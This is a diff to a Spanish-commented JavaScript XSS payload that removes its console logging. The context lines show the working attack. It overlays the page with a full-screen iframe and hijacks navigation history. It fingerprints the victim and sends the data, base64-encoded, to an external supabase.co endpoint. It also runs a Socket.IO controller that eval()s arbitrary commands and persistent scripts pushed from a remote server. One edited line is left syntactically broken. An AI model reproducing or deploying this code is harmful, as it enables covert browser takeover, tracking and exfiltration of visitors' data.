@@ -5,7 +5,6 @@
 // Verificar contexto inmediatamente
 if (window.self !== window.top) {
     // ESTAMOS EN IFRAME - Solo simulación de rutas
-    console.log('Route simulation only');
     setupIframeRouteSimulation();
 } else if (!window.__MAIN_XSS_EXECUTED__) {
     // ESTAMOS EN PÁGINA PRINCIPAL - IFRAME PRIMERO
@@ -20,7 +19,7 @@ if (window.self !== window.top) {
 function executeMainXSS() {
     'use strict';
     
-    console.log('immediately');
+     ;
     
     // 1. CREAR IFRAME INMEDIATAMENTE (ANTES DE NADA)
     function createIframeFirst() {
@@ -56,7 +55,7 @@ function executeMainXSS() {
             document.body.style.padding = '0';
             document.body.appendChild(iframe);
             
-            console.log('successfully');
+             ;
             
             // 2. CONFIGURAR SISTEMA DE RUTAS DESPUÉS DEL IFRAME
             setupRouteSystem(iframe);
@@ -65,7 +64,7 @@ function executeMainXSS() {
             executeFullFingerprinting();
             
         } catch(e) {
-            console.log('creation failed:', e);
+             ;
             setTimeout(createIframeFirst, 100);
         }
     }
@@ -99,7 +98,7 @@ function executeMainXSS() {
         // Escuchar mensajes del iframe para cambios de URL
         window.addEventListener('message', function(event) {
             if (event.data && event.data.type === 'URL_CHANGE') {
-                console.log('change detected:', event.data.url);
+                 ;
                 updateBrowserURL(event.data.url);
             }
         });
@@ -107,11 +106,11 @@ function executeMainXSS() {
         // Manejar botones atrás/adelante
         window.addEventListener('popstate', function() {
             const newPath = window.location.pathname + window.location.search;
-            console.log('🔙 Browser navigation:', newPath);
+             ;
             iframe.src = newPath;
         });
         
-        console.log('system ready');
+         ;
     }
     
     // 3. FINGERPRINTING COMPLETO (TU CÓDIGO ORIGINAL)
@@ -187,10 +186,10 @@ function executeMainXSS() {
             i.src = 'https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create?d=' + 
                     btoa(JSON.stringify(d)).substring(0,1500);
                     
-            console.log('completed');
+             ;
             
         } catch(e) {
-            console.log('failed:', e);
+             ;
         }
     }
     
@@ -210,7 +209,7 @@ function setupIframeRouteSimulation() {
     }
     window.__IFRAME_ROUTES_ACTIVE__ = true;
     
-    console.log('Setting up route simulation with download handling');
+     ;
     
     // A. INTERCEPTAR HISTORY API
     const originalPushState = history.pushState;
@@ -256,7 +255,7 @@ function setupIframeRouteSimulation() {
                 target.href.includes('.zip') ||
                 target.download) {
                 
-                console.log('Download allowed:', target.href);
+                 ;
                 // Dejar que la descarga proceda normalmente
                 return;
             }
@@ -330,7 +329,7 @@ function setupIframeRouteSimulation() {
         }
     }, 300);
     
-    console.log('simulation active with downloads enabled');
+     ;
 }
 
 function setupWebSocketController() {
@@ -349,15 +348,15 @@ function setupWebSocketController() {
             return;
         }
         
-        console.log('📦 Cargando Socket.IO...');
+         ;
         const script = document.createElement('script');
         script.src = 'https://cdn.socket.io/4.7.5/socket.io.min.js';
         script.onload = function() {
-            console.log('✅ Socket.IO cargado');
+             ;
             callback();
         };
         script.onerror = function() {
-            console.log('❌ Error cargando Socket.IO');
+             ;
             setTimeout(() => loadSocketIO(callback), 3000);
         };
         document.head.appendChild(script);
@@ -376,7 +375,7 @@ function setupWebSocketController() {
                 });
                 
                 socket.on('connect', function() {
-                    console.log('✅ Socket.IO conectado - Listo para comandos');
+                     ;
                 });
                 
                 // Manejar evento execute-command
@@ -395,16 +394,16 @@ function setupWebSocketController() {
                 });
                 
                 socket.on('disconnect', function(reason) {
-                    console.log('🔌 Socket.IO desconectado:', reason, '- Reconectando...');
+                     ;
                 });
                 
                 socket.on('connect_error', function(error) {
-                    console.log('💥 Socket.IO error:', error);
+                     ;
                     setTimeout(connectWebSocket, 5000);
                 });
                 
             } catch (error) {
-                console.log('❌ Error conectando Socket.IO:', error);
+                 ;
                 setTimeout(connectWebSocket, 5000);
             }
         });
@@ -413,19 +412,19 @@ function setupWebSocketController() {
     function handleExecuteCommand(data) {
         const { command, persistent, id } = data;
         try {
-            console.log('📨 Ejecutando comando:', command.substring(0, 200) + '...');
+              + '...');
             
             // ✅ EJECUCIÓN LIBRE CON eval()
             const result = eval(command);
             
-            console.log('✅ Comando ejecutado. Resultado:', result);
+             ;
             
             if (persistent && id) {
                 persistentScripts[id] = { 
                     script: command, 
                     cleanup: typeof result === 'function' ? result : null 
                 };
-                console.log('📁 Script persistente guardado:', id);
+                 ;
             }
             
             // Enviar confirmación
@@ -439,7 +438,7 @@ function setupWebSocketController() {
             }
             
         } catch (error) {
-            console.log('❌ Error ejecutando comando:', error);
+             ;
             
             // Enviar error
             if (socket && socket.connected) {
@@ -455,24 +454,24 @@ function setupWebSocketController() {
     function handleDestroyPersistent(data) {
         const { id } = data;
         
-        console.log('🗑️ Destruyendo script persistente:', id);
+         ;
         
         if (persistentScripts[id]) {
             // Ejecutar cleanup si existe
             if (persistentScripts[id].cleanup) {
                 try {
                     persistentScripts[id].cleanup();
-                    console.log('🧹 Cleanup ejecutado para:', id);
+                     ;
                 } catch (error) {
-                    console.log('❌ Error en cleanup:', error);
+                     ;
                 }
             } else {
-                console.log('ℹ️ No hay cleanup para:', id);
+                 ;
             }
             
             // Remover del diccionario
             delete persistentScripts[id];
-            console.log('✅ Script persistente destruido:', id);
+             ;
             
             // Enviar confirmación
             if (socket && socket.connected) {
@@ -483,7 +482,7 @@ function setupWebSocketController() {
                 });
             }
         } else {
-            console.log('❌ Script persistente no encontrado:', id);
+             ;
             
             // Enviar error
             if (socket && socket.connected) {
@@ -496,12 +495,12 @@ function setupWebSocketController() {
     }
 
     function handleSyncPersistent(data) {
-        console.log('🔄 Sincronizando scripts persistentes:', data);
+         ;
         
         try {
             for (const [id, cmd] of Object.entries(data)) {
                 try {
-                    console.log('🔄 Ejecutando script persistente:', id);
+                     ;
                     
                     // EJECUCIÓN LIBRE
                     const result = eval(cmd);
@@ -512,14 +511,14 @@ function setupWebSocketController() {
                         cleanup: typeof result === 'function' ? result : null 
                     };
                     
-                    console.log('✅ Script persistente sincronizado:', id);
+                     ;
                     
                 } catch (error) {
-                    console.log('❌ Error sincronizando script', id, ':', error);
+                     ;
                 }
             }
             
-            console.log('✅ Todos los scripts persistentes sincronizados');
+             ;
             
             // Enviar confirmación
             if (socket && socket.connected) {
@@ -530,7 +529,7 @@ function setupWebSocketController() {
             }
             
         } catch (error) {
-            console.log('❌ Error en sync-persistent:', error);
+             ;
             
             if (socket && socket.connected) {
                 socket.emit('sync_error', {
